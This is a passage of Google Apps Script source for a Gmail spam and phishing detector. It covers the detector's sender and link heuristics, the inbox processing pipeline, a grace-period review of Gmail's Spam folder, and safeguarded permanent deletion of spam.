 * ABSTAINS on these rather than firing. This abstention is load-bearing:
 * without it, a legitimate invoice whose "View in DocuSign" button is wrapped
 * by SendGrid click-tracking is a false positive (proven by ablation against
 * tests/ham_examples/Invoice ready to sign via click tracker.eml).
 *
 * Fail open, not closed: an unknown destination is not evidence of phishing.
 *
 * @const {Array<string>}
 */
const LINK_WRAPPER_DOMAINS = Object.freeze([
  // Email service providers' click tracking
  'sendgrid.net', 'awstrack.me', 'amazonses.com', 'list-manage.com',
  'mailchimp.com', 'mcusercontent.com', 'hubspotlinks.com', 'hs-sites.com',
  'mktoresp.com', 'mktomail.com', 'marketo.com', 'pardot.com', 'go.pardot.com',
  'exacttarget.com', 'exct.net', 'klclick.com', 'klclick1.com',
  'klaviyomail.com', 'sendinblue.com', 'brevo.com', 'brevosend.com',
  'mailgun.org', 'mandrillapp.com', 'sparkpostmail.com', 'postmarkapp.com',
  'resend.com', 'resend.dev', 'iterable.com', 'salesforce.com',
  // Security / gateway link rewriters (appear on inbound mail the user wants)
  'urldefense.com', 'urldefense.proofpoint.com',
  'safelinks.protection.outlook.com', 'mimecast.com', 'mimecastprotect.com',
  'linkprotect.cudasvc.com', 'barracudanetworks.com', 'clicktime.symantec.com',
  // Generic shorteners
  'bit.ly', 't.co', 'lnkd.in', 'hubs.ly', 'ow.ly', 'buff.ly', 'tinyurl.com',
  'rebrand.ly', 'goo.gl'
]);

/**
 * Leftmost-label heuristic for customer-CNAMEd tracker hosts.
 *
 * Senders commonly CNAME their own subdomain onto an ESP's click tracker, so
 * the wrapper appears as "click.acme.com" or "links.acme.com" rather than a
 * host in LINK_WRAPPER_DOMAINS. Treated the same way: abstain, do not fire.
 *
 * @const {Array<string>}
 */
const TRACKER_LABELS = Object.freeze([
  'click', 'clicks', 'ct', 'trk', 'track', 'tracking', 'link', 'links',
  'lnk', 'url', 'go', 'redirect', 'r', 'e', 'em', 't'
]);

/**
 * Verbs that make an anchor a call to action rather than prose.
 *
 * Signal 7 requires one of these alongside the brand name. Without it, the
 * footer sentence "About DocuSign — sign documents electronically" in a
 * GENUINE DocuSign email matches the brand and fires a false positive, as does
 * any news article mentioning the company. A lure needs a button the victim
 * clicks; prose does not.
 *
 * @const {RegExp}
 */
/**
 * Consumer free-mail providers. A sender here has no domain reputation to
 * stake, which is why spam uses them; it is also where most real people are,
 * so this is only ever used as one half of a two-part test.
 * @const {Array<string>}
 */
const FREE_MAIL_DOMAINS = Object.freeze([
  'gmail.com', 'googlemail.com', 'yahoo.com', 'yahoo.co.uk', 'ymail.com',
  'hotmail.com', 'hotmail.co.uk', 'outlook.com', 'live.com', 'msn.com',
  'aol.com', 'proton.me', 'protonmail.com', 'icloud.com', 'me.com',
  'mail.com', 'gmx.com', 'gmx.net', 'zoho.com', 'yandex.com'
]);

/**
 * Local parts that look machine-generated rather than chosen by a person.
 *
 * Two shapes, both deliberately narrow:
 *   letters, 3+ digits, THEN MORE LETTERS  -> raju47326yu, amit83920xk
 *   5+ consecutive digits                  -> pooja1029384, mailer99281
 *
 * The trailing-letters requirement is what makes the first safe: "john1985"
 * and "clark.kent1938" are how humans write a birth year and do NOT match.
 * Measured against 42 realistic personal and service addresses (jane.doe,
 * mike_92, tom99, jd1990, no-reply, jobalerts-noreply, dse_NA3...) with zero
 * matches, and 6/6 on spam-shaped ones.
 *
 * @const {Array<RegExp>}
 */
const RANDOM_LOCAL_PART_PATTERNS = Object.freeze([
  /^[a-z]{2,}\d{3,}[a-z]{1,6}$/i,
  /^[a-z.\-_]*\d{5,}[a-z.\-_]*$/i
]);

const CTA_VERB_PATTERN = /\b(view|open|review|sign|access|continue|download|proceed|complete|retrieve|verify|confirm)\b/i;


// =============================================================================
// Core Processing Pipeline
// =============================================================================

/**
 * Main entry point — scan inbox and process unprocessed emails.
 *
 * Should be configured as a time-driven trigger running every 1 minute.
 * Processes up to CONFIG.maxEmailsPerRun emails per invocation, with
 * per-thread error isolation so one bad email doesn't abort the entire run.
 *
 * Housekeeping (destroySpam, recheckRecentSpamChecked, checkFalseNegatives)
 * runs via runPeriodicMaintenance() on a 5-minute cadence, not every invocation.
 *
 * @throws {Error} Re-throws critical errors (e.g., auth failures) so trigger
 *                 failures are visible in Apps Script dashboard.
 */
function processInbox()
{
  const lock = LockService.getScriptLock();
  // tryLock(0): skip (don't queue) if another invocation holds the lock.
  // Queuing via waitLock() would cause executions to pile up under a
  // short trigger interval, which is exactly what we're trying to prevent.
  if (!lock.tryLock(0))
  {
    logInfo('Skipping run — previous execution still in progress');
    return;
  }

  // Reset audit state for this run. Inside the lock and after the skip check,
  // so a skipped invocation cannot clear a running one's tally.
  _destroyedMessageIds = [];
  _loggedMessageIds    = [];
  _unresolvedAgedSpam  = 0;

  // Declared out here, not in the try, because `finally` reads them to emit the
  // heartbeat even when the run throws.
  let spamCount      = 0;
  let processedCount = 0;
  let errorCount     = 0;
  let auditFindings  = 0;
  let runError       = null;

  try
  {
    // Validate config before doing any work. If something is misconfigured we
    // want a clear error immediately rather than silent misbehavior later on
    // ("fail fast" — crash early with a useful message instead of limping along).
    validateConfig();

    // Single search call — the only API call on the fast path when inbox is clean.
    const threads = GmailApp.search(buildSearchQuery(), 0, CONFIG.maxEmailsPerRun);

    if (threads.length > 0)
    {
      logInfo('Found ' + threads.length + ' threads to process');
      const startTime = Date.now();

      // Deferred label lookup — skipped entirely on empty-inbox runs.
      const label = getOrCreateLabel(CONFIG.processedLabel);

      // Batch-fetch all thread messages in one API call instead of N
      // separate thread.getMessages() calls — the dominant cost when
      // processing multiple threads per run.
      const allMessages = GmailApp.getMessagesForThreads(threads);

      for (let i = 0; i < threads.length; i++)
      {
        try
        {
          const thread = threads[i];
          const result = processThread(thread, allMessages[i]);

          spamCount      += result.spamCount;
          processedCount += result.processedCount;

          // Gate on DESTRUCTION, not on spamCount. addLabel() throws
          // "Not found" on a thread markAsSpam() permanently deleted, which is
          // why this skip exists — but a Rule 7 quarantine also sets
          // spamCount > 0 while leaving the thread alive. Skipping the label
          // there left the thread unprocessed, so it was re-detected on every
          // subsequent 1-minute run: an unbounded re-quarantine loop that
          // appended a PHISHING_DETECTED row and a Drive EML every minute
          // (~1440/day) and, via _quarantinedMessageIds, suppressed the spam
          // sweep indefinitely.
          if (!result.destroyed)
          {
            // An unevaluated message still gets SpamChecked (otherwise every
            // run re-fetches it), but is also flagged so it is not silently
            // indistinguishable from mail that passed all seven rules.
            if (result.unevaluated)
            {
              try { thread.addLabel(getOrCreateLabel(CONFIG.reviewLabel)); }
              catch (e) { logError('Could not flag unevaluated thread: ' + e.toString()); }
              logInfo('FLAGGED (too large to evaluate): ' +
                      sanitizeForLog(thread.getFirstMessageSubject()));
            }
            thread.addLabel(label);
          }
        }
        catch (threadError)
        {
          errorCount++;
          logError('Error processing thread: ' + threadError.toString());
        }
      }

      const duration = Date.now() - startTime;
      logInfo('Completed in ' + duration + 'ms: Processed ' + processedCount +
              ' emails, marked ' + spamCount + ' as spam, ' + errorCount + ' errors');
    }

    // Flush log entries from email processing (no-op when nothing was detected).
    flushSpamLog();

    // Maintenance runs at most every 5 minutes regardless of per-minute
    // email activity — avoids burning quota on housekeeping every invocation.
    // May queue additional log entries (false negatives, rechecked spam).
    runPeriodicMaintenance();

    // Second flush picks up any entries queued by maintenance.
    flushSpamLog();

    // Check that what the run believes it did matches what it recorded.
    // After both flushes, so _loggedMessageIds is complete.
    auditFindings = auditRunIntegrity();
  }
  catch (error)
  {
    // Recorded for the heartbeat in `finally`, so a failed run still reports.
    runError = error.toString();

    if (error.toString().includes('Service invoked too many times for one day: gmail'))
    {
      logInfo('Gmail quota exhausted for today — skipping run, will resume after quota reset');
      flushSpamLog();
      return;
    }
    logError('Critical error in processInbox: ' + error.toString());
    throw error; // Re-throw so trigger failure is visible in Apps Script dashboard
  }
  finally
  {
    // The heartbeat MUST be in `finally`, not at the end of the try.
    //
    // Placed in the try (v6.58.0) it only fired when the run succeeded, so a
    // run that threw reported nothing at all — indistinguishable from a trigger
    // that never fired. That is precisely the blind spot the heartbeat exists
    // to close, reintroduced one level down: the failure mode a health signal
    // most needs to report is the one that skips the health signal.
    //
    // `return` inside the catch (the Gmail-quota branch) also jumps straight
    // here, so that path reports too.
    //
    // Runs before releaseLock() so the write happens while this execution still
    // holds the lock, and cannot interleave with the next trigger's row.
    logRunHeartbeat({ processed: processedCount, spam: spamCount,
                      errors: errorCount, auditFindings: auditFindings,
                      runError: runError });

    lock.releaseLock();
  }
}

/**
 * Full historical inbox cleanse — two-speed mode:
 *
 *   DELETED:   Bulk + blacklisted sender (Rule 1 only) — zero false-positive risk.
 *   QUARANTINE: Everything else that scores as spam (Rules 2/3/4/5) — gets a
 *               "SuspectedSpam" label instead of being deleted. Review these
 *               in Gmail and drop false positives into tests/ham_examples/ so
 *               patterns can be improved.
 *
 * Syncs blacklist/whitelist from source before scanning. Processes in batches
 * of 50 with rate limiting. Run manually from the Apps Script editor.
 */
function cleanseInbox()
{
  const BATCH_SIZE   = 50;
  const MAX_BATCHES  = 10; // Safety cap: 10 × 50 = 500 emails max per run
  const SUSPECT_LABEL = CONFIG.reviewLabel;

  let deletedCount  = 0;
  let phishingCount = 0;
  let suspectCount  = 0;
  let cleanCount    = 0;
  let errorCount    = 0;

  try
  {
    const checkedLabel = getOrCreateLabel(CONFIG.processedLabel);
    const suspectLabel = getOrCreateLabel(SUSPECT_LABEL);
    const query = '{in:inbox category:updates category:promotions category:social category:forums}' +
                  ' -label:' + CONFIG.processedLabel;

    logInfo('CLEANSE MODE: Starting full inbox scan (max ' + (BATCH_SIZE * MAX_BATCHES) + ' emails)');

    for (let batch = 0; batch < MAX_BATCHES; batch++)
    {
      const threads = GmailApp.search(query, batch * BATCH_SIZE, BATCH_SIZE);
      logInfo('Cleanse batch ' + (batch + 1) + ': ' + threads.length + ' threads');

      if (threads.length === 0) break;

      for (let i = 0; i < threads.length; i++)
      {
        try
        {
          const thread   = threads[i];
          const messages = thread.getMessages();
          let threadDeleted  = false;
          let threadSuspect  = false;
          let threadHandled  = false;

          for (let m = 0; m < messages.length; m++)
          {
            const message = messages[m];

            // Single call to the real pipeline. This function used to re-implement
            // the whitelist check, bulk detection and blacklist check by hand and
            // then call analyzeMessage() two lines later anyway — duplicating even
            // the expensive getRawContent().
            //
            // That duplication was not just waste, it was a live security hole.
            // The hand-rolled copy matched with `fromLower.includes(entry)` against
            // the FULL From string, display name included, so:
            //   "billing@linkedin.com" <evil@evil.ru>    -> whitelisted, skipped
            //   "financebuzz roundup" <legit@company.com> -> blacklisted -> DELETED
            // v6.42.0 fixed both bugs in collectSignals() and this copy was missed,
            // so the delete path here kept the old behaviour for three releases.
            // Deleting the duplicate is the fix; sharing one code path is what stops
            // it recurring.
            const verdict = analyzeMessage(message);
            if (verdict.signals === null) continue;  // whitelisted
            if (!verdict.isSpam) continue;

            const firedRule = getRuleFromSignals(verdict.signals).rule;

            // Rule 1 (bulk + known spam mill) is definitive, so cleanse mode acts
            // on it. Rule 7 routes through the same disposition logic as the live
            // pipeline so a brand-mismatched CTA is quarantined here too, rather
            // than silently downgraded to a SuspectedSpam label.
            if (firedRule === 'Rule 1' || firedRule === 'Rule 7')
            {
              // Archive BEFORE disposing — getRawContent() is unavailable after a
              // batchDelete. cleanse mode previously deleted with no Drive EML and
              // no Sheets row at all, so a misjudged message left no trace.
              const archived = accumulateLogEntry(message, verdict.signals,
                (firedRule === 'Rule 7' || firedRule === 'Rule 9')
                  ? 'PHISHING_DETECTED' : 'SPAM_DETECTED');

              if (disposeDetectedMessage(message, thread, verdict.signals, archived))
              {
                deletedCount++;
                threadDeleted = true;
              }
              else
              {
                phishingCount++;
                threadHandled = true;   // quarantined: archived + Phishing label
              }
              break; // this message is handled; stop scanning the thread
            }

            // Rules 2-6: pattern-based — label for human review, never delete
            threadSuspect = true;
          }

          // Deleted or quarantined: disposition already applied the labels it
          // needs, and addLabel() throws on a destroyed thread.
          if (threadDeleted || threadHandled) continue;

          if (threadSuspect)
          {
            // Label as suspected spam + SpamChecked so processInbox won't re-touch it
            thread.addLabel(suspectLabel);
            thread.addLabel(checkedLabel);
            suspectCount++;
            logInfo('Quarantined (SuspectedSpam): ' + sanitizeForLog(thread.getFirstMessageSubject()));
          }
          else
          {
            thread.addLabel(checkedLabel);
            cleanCount++;
          }
        }
        catch (threadError)
        {
          errorCount++;
          logError('Cleanse error on thread: ' + threadError.toString());
        }
      }

      if (threads.length < BATCH_SIZE) break; // Reached the end

      Utilities.sleep(1000); // 1s between batches to respect quota
    }

    logInfo('CLEANSE COMPLETE: ' + deletedCount + ' deleted (Rule 1), ' +
            phishingCount + ' quarantined (Phishing label), ' +
            suspectCount + ' flagged (review SuspectedSpam label), ' +
            cleanCount + ' clean, ' + errorCount + ' errors');

    // Flush the archive buffer before the sweep. accumulateLogEntry() only
    // buffers; without this the Drive EMLs and Sheets rows for everything
    // deleted above are discarded.
    flushSpamLog();

    destroySpam();
  }
  catch (error)
  {
    logError('Critical error in cleanseInbox: ' + error.toString());
    throw error;
  }
}


/**
 * Safety-net cleanup of spam THIS DETECTOR condemned.
 *
 * Primary deletion happens in markAsSpam() by known message ID. This function
 * exists for one edge case:
 *   - Messages where the immediate delete in markAsSpam() failed
 *
 * Scoped by the CONFIG.purgeLabel tag that markAsSpam() applies before it
 * deletes. It deliberately does NOT clear pre-existing or Gmail-classified
 * spam any more: doing so permanently destroyed mail this script never
 * evaluated, unarchived and unlogged, within minutes of Gmail misfiling it.
 * Gmail purges its own Spam at 30 days, so the folder still drains on its own.
 *
 * Uses batch deletion in pages of 100 with rate limiting between batches.
 * Caps at MAX_ITERATIONS (10 batches = ~1000 messages) to prevent runaway
 * loops if something goes wrong with the API.
 */
/**
 * Re-judge mail GMAIL classified as spam, deleting only after a grace period.
 *
 * Gmail intercepts this mail before it reaches the inbox, so the detector's own
 * rules never see it. Left untouched it accumulates into a junk drawer the user
 * has to police; deleted on Gmail's word alone it destroys Gmail's own false
 * positives. The resolution is TIME, not a cleverer verdict — see the comment
 * inside the function for why the two earlier designs were both wrong.
 *
 * Disposition:
 *   whitelisted sender                  -> keep forever, log it, never touch
 *   aged past CONFIG.gmailSpamGraceDays  -> archive, log, permanently delete
 *   younger than the grace period        -> not even fetched (the query excludes it)
 *
 * Nothing is ever moved back to the inbox: rescuing a false positive has its
 * own failure mode (a wrong whitelist entry would re-deliver real spam) and
 * mail reappearing unasked is its own surprise. The user's recovery path is
 * Gmail's own "Not spam" button during the grace window.
 *
 * Every branch either deletes the message or marks the thread reviewed, so no
 * message is ever re-fetched cycle after cycle. See markReviewed().
 */
function reviewGmailSpam(forceFullReview)
{
  const REVIEW_LIMIT = 20;

  // ── Phase 1: review unseen Spam, delete anything corroborated ───────────
  //
  // Gmail already judged these. That verdict is evidence our inbox rules never
  // get to lean on, which is why they demand two or more behaviours. Here one
  // independent signal is enough — and that is what closes the gap that left
  // raju47326yu@gmail.com sitting in the folder: no inbox rule fires on a
  // direct-send free-mail address, and gmail.com cannot be blacklisted, but
  // "machine-generated local part" plus "Gmail flagged it" is a confident call.
  //
  // Anything with NO corroborating signal is not deleted here. It is marked
  // reviewed so it is never re-fetched, and phase 2 removes it once it has had
  // a recovery window.
  try
  {
    // forceFullReview drops the "already reviewed" exclusion.
    //
    // A message reviewed by an OLDER version carries processedLabel, so it is
    // permanently invisible to any later improvement in the review logic. That
    // is not hypothetical: v6.50.1 began marking left-alone spam, and when
    // v6.52.0 added Signal 8 specifically to catch throwaway free-mail senders,
    // the messages it was written for had already been marked by the previous
    // logic and were skipped. The fix that mattered could not see the mail it
    // was for.
    //
    // So on a version change, re-examine the folder from scratch — exactly the
    // reasoning recheckRecentSpamChecked() already applies to the inbox. Once
    // per deploy, bounded by REVIEW_LIMIT, so it costs one pass rather than a
    // permanent loop.
    //
    // ONE-SHOT IS DELIBERATE — do not "fix" it into a drain loop. Because the
    // forced query drops the processedLabel exclusion, it returns the same first
    // REVIEW_LIMIT threads on every call. Anything reviewed-but-not-deleted
    // (whitelisted, or uncorroborated and awaiting grace) therefore keeps coming
    // back, so the set never shrinks and a repeating forced pass would re-fetch
    // it forever. That is precisely the 11,500-reads/day leak v6.50.1 closed.
    // runPeriodicMaintenance() writes LAST_SEEN_VERSION before calling this, so
    // exactly one pass runs per version. A folder holding more than REVIEW_LIMIT
    // unseen threads is only partly re-reviewed; the remainder still exits via
    // phase 2's grace period, which is the correct fallback.
    const query = forceFullReview
      ? 'in:spam -label:' + CONFIG.purgeLabel
      : 'in:spam -label:' + CONFIG.purgeLabel + ' -label:' + CONFIG.processedLabel;
    const threads = GmailApp.search(query, 0, REVIEW_LIMIT);

    if (threads.length > 0)
    {
      logInfo('Reviewing ' + threads.length + ' Gmail-classified thread(s)' +
              (forceFullReview ? ' (full re-review: detection logic changed)' : ''));
      const allMessages = GmailApp.getMessagesForThreads(threads);
      let deleted = 0, kept = 0, waiting = 0;

      for (let i = 0; i < threads.length; i++)
      {
        try
        {
          const thread   = threads[i];
          const messages = allMessages[i];
          if (!messages || messages.length === 0) continue;
          const message = messages[0];

          const signals = collectSignals(message);

          // Whitelisted: never deleted, at any age, by any phase.
          if (signals === null)
          {
            // NOT logged to the Sheet. The Sheet records what the detector DID
            // to mail — deleted, quarantined — and a whitelisted keep is mail
            // it deliberately left alone. Rows for it read as "LinkedIn was
            // flagged as spam", which is the opposite of what happened.
            //
            // It also duplicated without bound. Whitelisted mail is never
            // deleted, so it stays in the folder forever, and the v6.54.0
            // forced re-review re-judges the whole folder on every version
            // change — one new pair of rows per deploy, for the same two
            // LinkedIn invitations. Phase 2 already had this right: it counts
            // spared whitelisted mail and writes no row.
            //
            // The information is not lost: logInfo below records it in the
            // execution transcript, which is where a non-action belongs.
            markReviewed(thread);
            kept++;
            logInfo('KEPT (whitelisted sender Gmail misfiled): ' +
                    sanitizeForLog(message.getSubject()));
            continue;
          }

          if (!hasCorroboratingSignal(signals))
          {
            // Gmail's word alone. Marked so it is judged once, then left for
            // phase 2 to remove after CONFIG.gmailSpamGraceDays.
            markReviewed(thread);
            waiting++;
            continue;
          }

          const logType = makeVerdict(signals)
            ? 'GMAIL_SPAM_CONFIRMED'
            : 'GMAIL_SPAM_CORROBORATED';

          if (accumulateLogEntry(message, signals, logType) !== true)
          {
            logError('Cannot archive, so NOT deleting: ' +
                     sanitizeForLog(message.getSubject()));
            markReviewed(thread);
            continue;
          }

          if (deleteMessagePermanently(message, thread)) { deleted++; }
          else { markReviewed(thread); }
        }
        catch (threadError)
        {
          logError('reviewGmailSpam phase 1 error: ' + threadError.toString());
          try { markReviewed(threads[i]); } catch (e) { /* best effort */ }
        }
      }

      logInfo('Phase 1: deleted ' + deleted + ' corroborated, kept ' + kept +
              ' whitelisted, ' + waiting + ' awaiting grace period');
    }
  }
  catch (error)
  {
    logError('reviewGmailSpam phase 1 failed: ' + error.toString());
  }

  // ── Phase 2: delete aged mail on Gmail's word alone ─────────────────────
  //
  // Nothing here corroborated, so the only justification is Gmail's verdict
  // plus the fact that the message has now had CONFIG.gmailSpamGraceDays in a
  // folder the user can open, search and click "Not spam" in. That window is
  // the protection; the whitelist check below is belt-and-braces.
  //
  // Uses the cheap getFrom()-only whitelist test, so this pass costs no extra
  // Gmail read for messages it keeps.
  try
  {
    const agedQuery = 'in:spam older_than:' + CONFIG.gmailSpamGraceDays + 'd' +
                      ' -label:' + CONFIG.purgeLabel;
    const aged = GmailApp.search(agedQuery, 0, REVIEW_LIMIT);
    if (aged.length === 0) return;

    logInfo('Aging out ' + aged.length + ' Gmail-classified thread(s) older than ' +
            CONFIG.gmailSpamGraceDays + ' days');

    const agedMessages = GmailApp.getMessagesForThreads(aged);
    let expired = 0, spared = 0;

    for (let i = 0; i < aged.length; i++)
    {
      try
      {
        const thread   = aged[i];
        const messages = agedMessages[i];
        if (!messages || messages.length === 0) continue;
        const message = messages[0];

        if (isWhitelistedSender(message)) { spared++; continue; }

        if (accumulateLogEntry(message, null, 'GMAIL_SPAM_EXPIRED') !== true)
        {
          logError('Cannot archive aged spam, NOT deleting: ' +
                   sanitizeForLog(message.getSubject()));
          _unresolvedAgedSpam++;
          continue;
        }

        if (deleteMessagePermanently(message, thread)) { expired++; }
        else { _unresolvedAgedSpam++; }
      }
      catch (threadError)
      {
        logError('reviewGmailSpam phase 2 error: ' + threadError.toString());
        _unresolvedAgedSpam++;
      }
    }

    logInfo('Phase 2: deleted ' + expired + ' aged, spared ' + spared +
            ' whitelisted');
  }
  catch (error)
  {
    logError('reviewGmailSpam phase 2 failed: ' + error.toString());
  }
}

/**
 * Refuse a SpamMissed request: swap the label for the review label and say why.
 *
 * Swapped rather than cleared, and swapped rather than kept.
 *
 * Cleared was invisible. From Gmail the sequence read "apply SpamMissed ->
 * nothing happens -> the label vanishes", which is indistinguishable from the
 * feature being broken. logError only reaches the Apps Script execution
 * transcript, which nobody reads.
 *
 * Kept caused an unbounded retry. checkFalseNegatives() finds threads by
 * `label:SpamMissed`, so leaving it made the refusal repeat every maintenance
 * cycle — and because the Sheets row is buffered before the archive check, each
 * repeat wrote a duplicate row and paid two getRawContent() fetches. Measured:
 * 288 rows and 576 reads per day for a single stuck message.
 *
 * Swapping satisfies both: the `label:SpamMissed` search no longer matches, so
 * there is exactly one row and one log line, and the user sees the outcome
 * where they made the request. CONFIG.reviewLabel is reused deliberately — it
 * already means "held, not acted on, nothing here was deleted", and it appears
 * in no deletion query.
 *
 * @param {GmailThread} thread
 * @param {GmailLabel|null} missedLabel - The SpamMissed label, if resolvable.
 * @param {string} reason - Logged verbatim at error level.
 */
function swapSpamMissedForReview(thread, missedLabel, reason)
{
  try
  {
    const review = getOrCreateLabel(CONFIG.reviewLabel);
    if (review) thread.addLabel(review);
    if (missedLabel) thread.removeLabel(missedLabel);
    logError(reason + ' Moved to the "' + CONFIG.reviewLabel + '" label.');
  }
  catch (e)
  {
    logError('Could not swap SpamMissed for the review label: ' + e.toString());
  }
}

/**
 * Does any independent signal corroborate an existing spam verdict?
 *
 * Used ONLY for mail already sitting in the Spam folder, where Gmail has
 * already judged the message. That verdict is evidence, and our own rules
 * require two or more behaviours precisely because on inbox mail they have no
 * prior to lean on. Here they do, so ONE corroborating signal is enough.
 *
 * This is the gap that left raju47326yu@gmail.com in the folder: no inbox rule
 * fires on a direct-send free-mail address, and gmail.com obviously cannot be
 * blacklisted — but "free-mail sender with a machine-generated local part"
 * plus "Gmail already flagged it" is a confident call.
 *
 * Deliberately excludes bulkEmailService: virtually every newsletter the user
 * actually wants is bulk-routed, so it corroborates nothing.
 *
 * @param {Object|null} signals - From collectSignals(); null means whitelisted.
 * @return {boolean} true if at least one independent signal fired.
 */
function hasCorroboratingSignal(signals)
{
  if (!signals) return false;

  return signals.blacklistedSender ||
         signals.clickbaitCount >= 1 ||
         signals.fearMongering ||
         signals.marketingFormat ||
         signals.suspiciousFromName ||
         signals.serviceImpersonation ||
         signals.brandMismatchedCta ||
         signals.freeMailRandomLocal ||
         signals.callbackPhishing;
}

/**
 * Cheap whitelist test that costs no extra Gmail fetch.
 *
 * Only reads getFrom(), which comes with the message metadata, so the aged
 * deletion pass can protect whitelisted senders without paying for
 * collectSignals()' getRawContent().
 *
 * @param {GmailMessage} message
 * @return {boolean}
 */
function isWhitelistedSender(message)
{
  try
  {
    const addr = extractEmailAddress(
      sanitizeInput(message.getFrom()).replace(RFC2822_QUOTED_NAME, '$1$2'));
    const whitelist = getCachedWhitelist();
    for (let i = 0; i < whitelist.length; i++)
    {
      if (addressMatchesDomain(addr, whitelist[i])) return true;
    }
  }
  catch (e)
  {
    // Cannot read the sender — treat as whitelisted, i.e. do not delete.
    logError('Whitelist check failed, refusing to delete: ' + e.toString());
    return true;
  }
  return false;
}

/**
 * Mark a thread as reviewed so it is not re-examined every cycle.
 *
 * Every non-deleting branch of reviewGmailSpam() must call this. A decision
 * made and not recorded is recomputed forever: at two Gmail reads per message
 * and a five-minute cadence that is thousands of wasted reads a day, and quota
 * exhaustion stops detection entirely. This project has already shipped that
 * bug twice.
 *
 * @param {GmailThread} thread
 */
function markReviewed(thread)
{
  try
  {
    const processed = getOrCreateLabel(CONFIG.processedLabel);
    if (processed) thread.addLabel(processed);
  }
  catch (e)
  {
    logError('Could not mark thread reviewed: ' + e.toString());
  }
}

/**
 * Permanently delete one message, reporting whether it actually happened.
 *
 * markAsSpam() is deliberately forgiving — it falls back to
 * thread.moveToSpam() when the Advanced Gmail Service is missing, and swallows
 * a failed batchDelete so the safety-net sweep can retry. Both are right for
 * its own callers and wrong for a counter: reviewGmailSpam() needs to know
 * whether the message is gone, so it can mark the thread and stop re-archiving
 * a survivor on every cycle.
 *
 * @param {GmailMessage} message
 * @param {GmailThread}  thread
 * @return {boolean} true only if the permanent delete was issued.
 */
function deleteMessagePermanently(message, thread)
{
  if (typeof Gmail === 'undefined' || !Gmail.Users || !Gmail.Users.Messages)
  {
    logError('Gmail Advanced Service unavailable — cannot permanently delete ' +
             sanitizeForLog(message.getSubject()));
    return false;
  }

  try
  {
    const messageId = message.getId();
    const purgeId   = getLabelId(CONFIG.purgeLabel);

    Gmail.Users.Messages.modify(
      { addLabelIds: purgeId ? ['SPAM', purgeId] : ['SPAM'] }, 'me', messageId);
    Gmail.Users.Messages.batchDelete({ ids: [messageId] }, 'me');
    _destroyedMessageIds.push(messageId);

    logInfo('GMAIL SPAM DESTROYED: ' + sanitizeForLog(message.getSubject()));
    return true;
  }
  catch (e)
  {
    logError('Permanent delete failed: ' + e.toString());
    return false;
  }
}

function destroySpam()
{
  // Guard: Gmail Advanced Service must be enabled in the project
  if (typeof Gmail === 'undefined' || !Gmail.Users || !Gmail.Users.Messages)
  {
    logInfo('Gmail API not available for spam destruction');
    return;
  }

  // Resolve the purge label first. Without it the sweep has no way to tell our
  // verdicts from Gmail's, and the safe answer is to sweep NOTHING rather than
  // fall back to deleting the whole folder.
  const purgeLabelId = getLabelId(CONFIG.purgeLabel);
  if (!purgeLabelId)
  {
    logError('Cannot resolve the purge label — skipping the spam sweep rather ' +
             'than risk deleting mail this detector never judged');
    return;
  }

  let destroyed = 0;
  let iterations = 0;
  const BATCH_SIZE     = 100; // Gmail API max results per page
  const MAX_ITERATIONS = 10;  // Safety cap: max 10 × 100 = 1000 messages per run
  const RATE_LIMIT_MS  = 500; // 500ms between batches to respect Gmail API quota

  // Keep pulling pages of spam until the folder is empty or we hit the cap
  while (iterations < MAX_ITERATIONS)
  {
    iterations++;

    // Fetch a page of spam messages
    let response;
    try
    {
      // Residual protection: a quarantined message never enters Spam, so it
      // should not appear here at all. This exclusion covers the one way it
      // could — the user later reporting it as spam themselves.
      // Label INTERSECTION, not a q: string. labelIds are ANDed, so this
      // matches only messages carrying BOTH SPAM and our purge tag — i.e. mail
      // this detector condemned and already archived to Drive. Mail Gmail
      // classified never carries the tag and is left for Gmail's own 30-day
      // purge, so a Gmail false positive stays recoverable.
      //
      // A q: filter is deliberately avoided: it reads the search index, and an
      // index-lagged '-label:Phishing' query is what permanently deleted a
      // quarantined message on 2026-09-16. If the purge tag is itself
      // index-lagged the message simply is not swept this cycle and is picked up
      // on the next one — the failure mode is a delayed delete, not a premature
      // one.
      response = Gmail.Users.Messages.list('me', {
        labelIds: ['SPAM', purgeLabelId],
        maxResults: BATCH_SIZE
      });
    }
    catch (e)
    {
      logError('Failed to list spam messages: ' + e.toString());
      break; // API error — stop rather than retry in a loop
    }

    // No more messages — spam folder is clean
    if (!response.messages || response.messages.length === 0)
    {
      break;
    }

    // Extract message IDs for batch deletion, minus anything quarantined in
    // this execution. Quarantine does not apply the SPAM label so these should
    // never appear here; excluding them by id costs nothing and depends on no
    // index. See _quarantinedMessageIds.
    const ids = response.messages
      .map(function(m) { return m.id; })
      .filter(function(id) { return _quarantinedMessageIds.indexOf(id) === -1; });

    if (ids.length === 0)
    {
      logInfo('Spam page contained only quarantined messages — nothing to destroy');
      break;
    }

    // Permanently delete the batch (bypasses Trash — messages are gone)
    try
    {
      Gmail.Users.Messages.batchDelete({ ids: ids }, 'me');
      destroyed += ids.length;
    }
    catch (e)
    {
      logError('Batch destroy failed: ' + e.toString());
      break; // Don't retry — likely a quota or permission issue
    }

    Utilities.sleep(RATE_LIMIT_MS);
  }

  if (iterations >= MAX_ITERATIONS)
  {
    logInfo('Destroy hit max iterations (' + MAX_ITERATIONS + ') - tagged messages may remain');
  }

  if (destroyed > 0)
  {
    logInfo('Destroyed ' + destroyed + ' spam messages');
  }
}

/**
 * Process a single Gmail thread and return detection statistics.
 *
 * Iterates through all messages in the thread, running each through the
 * detection pipeline. If any message is spam, the entire thread is flagged
 * (but only once — the first spam message triggers the action).
 *
 * Per-message error isolation ensures one unparseable message doesn't
 * prevent processing of other messages in the same thread.
 *
 * @param {GmailThread}        thread   - The Gmail thread to process.
 * @param {Array<GmailMessage>} messages - Messages pre-fetched by the caller via
 *   GmailApp.getMessagesForThreads() — collapses N individual thread.getMessages()
 *   HTTP calls into one batched API call at the processInbox() level.
 * @return {{spamCount: number, processedCount: number}} Detection statistics.
 */
function processThread(thread, messages)
{
  // Defensive guard: getMessagesForThreads() should always return an array, but
  // an empty or missing result means there is nothing to process for this thread.
  if (!messages || messages.length === 0)
  {
    return { spamCount: 0, processedCount: 0 };
  }

  let spamCount = 0;
  let processedCount = 0;
  let threadMarkedAsSpam = false;
  // Tracked separately from spamCount. A Rule 7 quarantine increments
  // spamCount but leaves the thread ALIVE, so callers must not infer
  // "thread is gone" from spamCount > 0.
  let threadDestroyed = false;
  // Set when a message was skipped without being evaluated (oversize). The
  // caller flags such threads rather than marking them clean.
  let threadUnevaluated = false;

  // Process all messages in the thread
  for (let i = 0; i < messages.length; i++)
  {
    try
    {
